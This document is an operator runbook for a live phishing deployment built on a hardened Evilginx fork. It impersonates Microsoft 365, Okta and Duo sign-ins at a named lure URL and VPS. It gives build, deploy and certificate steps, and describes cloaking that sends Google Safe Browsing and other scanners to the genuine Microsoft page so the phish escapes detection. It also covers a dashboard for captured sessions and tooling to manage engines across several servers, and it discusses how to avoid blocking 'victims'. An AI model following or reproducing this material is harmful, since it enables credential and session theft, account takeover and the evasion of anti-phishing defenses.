# Operator Runbook — platoveriour.com (Evilginx hardened fork)

Everything an operator needs to rebuild, deploy, verify and not break the
anti‑Google‑Safe‑Browsing (GSB) posture.

---

## 1. Live facts

| Item | Value |
|---|---|
| Config domain | `platoveriour.com` |
| **Public lure link** | **`https://login.platoveriour.com/auth/login`** |
| VPS | `45.95.99.77` (root) |
| Service | `evilginx.service` (systemd, `Restart=always`) |
| Binary | `/root/evilginx2/build/evilginx` |
| Config dir | `/root/evilginx2/cfg/` (`config.json`, `blacklist.txt`, `crt/`, `GeoIP/`, `data.db`) |
| Wildcard cert | `/root/evilginx2/cfg/crt/wildcard/{fullchain,privkey}.pem` |
| Control panel / Dashboard | `http://45.95.99.77:5000` and `https://panel.platoveriour.com` (login page) |
| Operator control panel | separate app — `panel.bat` → `http://127.0.0.1:8080` |
| Phishlet | `o365new` (o365/Okta/Duo/GoDaddy/OneLogin chain) |
| Decoy (`unauth_url`) | `https://login.microsoftonline.com/` (302) |
| Blacklist mode | `unauth` |

> The apex `platoveriour.com` is **not** the lure host. Share the `login.` URL.

---

## 2. Anti‑GSB invariants (do not break these)

1. **Crawlers get a `302` to the real login.** Detection is by User‑Agent **and**
   by Google crawler source IP range. Never make a scanner render the phish.
2. **`:80` is always bound** and redirects to `https://`.
3. **`config unauth_url https://login.microsoftonline.com`** + **`config unauth_redirect on`**:
   unauthorized/blocked traffic leaves the domain with a `302` to the genuine login.
4. **`blacklist unauth`** stays on so stray visitors are kept off the phish.
5. Do **not** re‑enable evilginx fingerprint headers (`strip_headers` stays `on`).

Quick proof (run from anywhere):

```bash
# must print: HTTP/1.1 302 ... Location: https://login.microsoftonline.com/
curl -sD- -o /dev/null -A 'Mozilla/5.0 (compatible; Google-SafeBrowsing/2.0)' \
  https://login.platoveriour.com/auth/login

# must print: 302 -> https://login.platoveriour.com/auth/login
curl -sD- -o /dev/null -A 'Mozilla/5.0 (compatible; Google-SafeBrowsing/2.0)' \
  http://login.platoveriour.com/auth/login

# GSB status (status field 1 == clean)
curl -s 'https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=platoveriour.com'
```

---

## 3. Build (Windows dev box → linux binary)

```powershell
cd <repo>
$env:GOOS="linux"; $env:GOARCH="amd64"; $env:CGO_ENABLED="0"
go build -mod=mod -o build\evilginx-linux .
(Get-FileHash build\evilginx-linux -Algorithm SHA256).Hash.ToLower()
```

## 4. Deploy

```bash
# upload
pscp -batch -pw <PW> build/evilginx-linux root@45.95.99.77:/root/evilginx2/build/evilginx.new
```

```bash
# on the VPS — verify hash, swap, restart
sha256sum /root/evilginx2/build/evilginx.new          # must match the local hash
cp -a /root/evilginx2/build/evilginx /root/evilginx2/build/evilginx.bak-$(date +%F)
systemctl stop evilginx
mv -f /root/evilginx2/build/evilginx.new /root/evilginx2/build/evilginx
chmod +x /root/evilginx2/build/evilginx
systemctl start evilginx
sleep 3; systemctl is-active evilginx
ss -tlnp | grep -E ':80 |:443 |:5000 |:53 '         # :80 and :443 must be present
journalctl -u evilginx -n 30 -o cat | grep -iE 'wildcard|geoip|error'
```

## 5. Post‑deploy verification

- [ ] `https://login.platoveriour.com/auth/login` in a private window → real Microsoft page (`Sign in to your account`)
- [ ] scanner‑UA curl → `302` to `https://login.microsoftonline.com/`
- [ ] `http://` any host → `302` to `https://`
- [ ] dashboard `:5000` responds `401` unauthenticated, `200` with creds
- [ ] server cert still `CN=*.platoveriour.com` (`openssl s_client -connect 127.0.0.1:443 -servername login.platoveriour.com`)

---

## 6. Cert renewal (manual, DNS‑01)

The wildcard cert expires ~6 weeks after issue. When it does:

```bash
certbot certonly --manual --preferred-challenges dns -d '*.platoveriour.com' -d 'platoveriour.com'
# add the TXT record in Cloudflare (_acme-challenge), verify:
dig @1.1.1.1 _acme-challenge.platoveriour.com TXT +short
# press enter, then:
cp /etc/letsencrypt/live/platoveriour.com/fullchain.pem /root/evilginx2/cfg/crt/wildcard/
cp /etc/letsencrypt/live/platoveriour.com/privkey.pem   /root/evilginx2/cfg/crt/wildcard/
chmod 644 /root/evilginx2/cfg/crt/wildcard/fullchain.pem
chmod 600 /root/evilginx2/cfg/crt/wildcard/privkey.pem
systemctl restart evilginx
```

Cloudflare DNS must stay **DNS Only (grey)** — an orange proxy replaces the cert
and breaks the flow.

---

## 7. Useful commands (headless, no terminal)

The service runs `-noterm`. To change live settings, edit `cfg/config.json` and
restart, or run a second copy interactively. Common ones:

```
config                      # show everything
config unauth_url <url>
config unauth_redirect on|off
config strip_headers on|off
blacklist delete <ip>       # also writes blacklist.txt
lures get-url 0
sessions
```

Rebuild the lure URL: `lures get-url 0` → `https://login.platoveriour.com/auth/login`.

---

## 8. Known caveats

- Dashboard is plain HTTP on `0.0.0.0:5000`. Set `config dashboardsub panel` to also
  expose it over HTTPS at `https://panel.platoveriour.com` (wildcard covers it and
  `panel` is not used by any phishlet).
- `blacklist.txt` grows over time (currently ~590 entries) as scanners are added.
  It is harmless but can be pruned for known-good IPs with `blacklist delete <ip>`.
- `-block-vpn` is **off**. Turning it on blocks corporate-VPN victims too, since the
  decoy is served before a session exists — test before enabling.

---

## 9. Control panel

The web control panel (`core/dashboard.go`, `core/panel_api.go`, `core/panel_assets.go`,
`core/panel_app.go`) replaces the old dashboard. The **Dashboard is Sessions-only**;
all management moved to the separate **Control Panel** app (`controlpanel/`) which
drives the engine API remotely over SSH-proxied HTTP.

- URLs: `http://45.95.99.77:5000` and `https://panel.platoveriour.com` (sessions only)
- Operator console: `panel.bat` → `http://127.0.0.1:8080` → **Manage** on a server
- Portable build: `build-portable.bat` → `dist/evil-pro-control-panel/` (copy anywhere, START.bat, first run sets login + port)
- Manage tabs: Sessions, Phishlets, Lures, Autolures, Redirects, Blacklist, Settings, Logs
- Redirects have an 8-template gallery with live previews, Turnstile placement/type/theme and per-page branding (brand, title, subtitle, accent, logo, button, status lines)
- Login for the *engine* (used by Manage + the Dashboard): `admin` / `config.json dashboard_pass`
- API base: `/api/v1/` — e.g. `curl -u admin:PASS .../api/v1/redirect-templates`

Fixed alongside the panel: `monitorLurePause()` and `monitorAutoLureRotation()` are
now started from `NewTerminal`, so lure pause expiry and autolure rotation actually
run in headless `-noterm` mode (they previously only ran in the interactive shell).

---

## 10. Operator control panel (separate app)

`controlpanel/` is a standalone Go app (`build\evilpro-panel.exe`, launched with
`panel.bat`) that SSH‑installs and manages engines across multiple VPSes, with
profiles + pinning, one-click install/update, status/logs/actions and hand-off.
Full docs: **[CONTROL-PANEL.md](CONTROL-PANEL.md)**.

---

## 11. Host hardening applied (2026‑10‑25)

A scanner flood piled up ~23k half‑open TLS connections, exhausted RAM/swap on this
1 vCPU / 2 GB box and froze sshd too. Mitigations applied on the VPS:

- swap enlarged 512 MB → 2 GB; `vm.swappiness=10`
- `fs.file-max=500000`, `net.core.somaxconn=8192`, `tcp_fin_timeout=15`
- service `LimitNOFILE=200000`
- `sshd_config.d/99-evilpro.conf`: `MaxStartups 30:50:200`, `PerSourceMaxStartups 12`
- engine timeouts tightened (read/write 25 s, idle 40 s, header 15 s) so stalled
  handshakes recycle before they accumulate

If the box ever looks frozen again (TCP connects, no data), check
`ss -tn state established | wc -l` and `free -m`, then `systemctl restart evilginx`.
